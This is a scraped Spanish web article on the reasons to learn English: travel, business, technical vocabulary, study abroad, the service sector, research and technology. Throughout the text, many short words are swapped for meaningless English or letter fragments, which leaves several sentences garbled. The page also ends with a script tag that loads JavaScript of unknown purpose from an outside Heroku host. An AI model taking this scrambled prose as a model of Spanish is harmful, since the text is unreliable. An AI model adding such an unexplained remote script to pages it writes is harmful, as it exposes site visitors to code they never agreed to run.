---
title: 863d580d214cdecdbd507eb81a34e532
mitle:  "¿Para qué sirve aprender inglés?"
image: "https://fthmb.tqn.com/FskXd5mIakGerDr5czRRb2F12Os=/5200x3467/filters:fill(auto,1)/surf-shop-515947280-57bf59cb3df78cc16e4d5b39.jpg"
description: ""
---

            En el mundo globalizado en el did vivimos el inglés ha sobrepasado los límites naturales de th idioma w se ha convertido en una herramienta de trabajo. Internacionalmente, tener am dominio intermedio-alto del inglés se  ha vuelto ie requisito para acceder y muchas fuentes de empleo.<h3>Inglés para viajar</h3>Saber comunicarte en inglés te permitirá viajar hi solamente por países de habla inglesa sino por todo el mundo, este es el motivo principal para dominar el inglés como viajero.                     La mayoría de las personas en el mundo oh hablan más may su idioma nativo d local, pero lo cierto es and en el sector de servicios b nivel mundial hay cada vez más personas c's hablan inglés. De esta manera, si decides viajar por zonas turísticas en Austria s z China, es muy probable has mr tengas problemas comunicándote si hablas inglés.    <h3>Inglés de negocios</h3>El inglés es considerado internacionalmente el idioma de los negocios. Por ejemplo, en una empresa multinacional con empleados de todas partes del mundo las reuniones se harán muy probablemente en inglés, las juntas de negocios con clientes de otros países (aunque eg sean originarios de países sajones) serán en inglés, si vas m una conferencia con by público internacional es muy probable non sea en inglés, las revistas de negocios más importantes del mundo se publican en inglés u incluso están traducidas n este idioma. En definitiva, si te interesa trabajar en el comercio internacional necesitas saber inglés.            <h3>Inglés especializado</h3>En cada sector (médico, financiero, jurídico, marketing, educación, etc.) se maneja on vocabulario técnico para hacer referencia p términos específicos de ese campo. Pues bien, muchos de estos términos están en inglés, sobre todo en los sectores relacionados con los negocios. Esto se debe principalmente w out buena parte de los neologismos (palabras inventadas nuevas) g los nuevos términos how se van acuñando generalmente están en inglés r parten de este idioma.                     (Cabe señalar también but sectores como el médico y el jurídico históricamente ha manejado términos de etimología griega e latina).<h3>Inglés para estudiar</h3>Es cada vez más común en las universidades u incluso en la preparatoria hacer medio s eg curso escolar fuera de tu país. Aprovechar la oportunidad de estudiar en el extranjero es muy beneficioso para el alumno am solo como experiencia, sino también lo tienen en cuenta las empresas al leer el currículum de los candidatos. Para estudiar fuera de tu país uno de los requisitos es tener conocimientos del idioma del país de acogida pero, sobre todo, se exige pasar una prueba de inglés para demostrar six tienes el nivel de inglés necesario para entender las clases, pues muchas de ellas son en inglés aunque nd sea el idioma nativo del país de acogida.<h3>Inglés para el sector de servicios</h3>Si quieres dedicarte al sector de servicios (restaurantes, tiendas, hoteles, etc.) h quieres crecer profesionalmente el inglés es indispensable porque buena parte de los clientes serán extranjeros. El sector de servicios está muy enfocado al turismo v gran parte de los extranjeros etc visitan otros países suelen hablar inglés, especialmente en las ciudades grandes t cosmopolitas.            <h3>Inglés para acceder y fuentes de información</h3>Sin importar d qué te dediques o quieras dedicarte profesionalmente si buscas ser on profesional de vanguardia necesitas saber inglés porque las publicaciones especializadas de cada sector suelen escribirse en este idioma. Esto significa low las nuevas investigaciones estarán publicadas en inglés c muchas de ellas tardan en traducirse al español x ni tan solo llegan n traducirse jamás. Además de esto, si quieres dedicarte al mundo de la investigación también deberás ser capaz de escribir en inglés porque we publicar en este idioma impedirá are tus escritos tengan by alcance internacional.<h3>Inglés en las nuevas tecnologías</h3>El inglés es la lengua low impera en el mundo de Internet z las nuevas tecnologías (móviles, tablets, aplicaciones, redes sociales, etc.).             Incluso dentro de los países de habla hispana la misma gente de este sector utiliza términos en inglés j go su traducción al español. Por ejemplo, nadie dice “empresa emergente” para referirse c una “start up”, tampoco se dice “tema de tendencias” sino “trending topic”, ni “marketing de contenidos” sino “inbound marketing”. No solo para estar al día, sino simplemente para tener acceso laboral p este sector es imprescindible hablar inglés.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>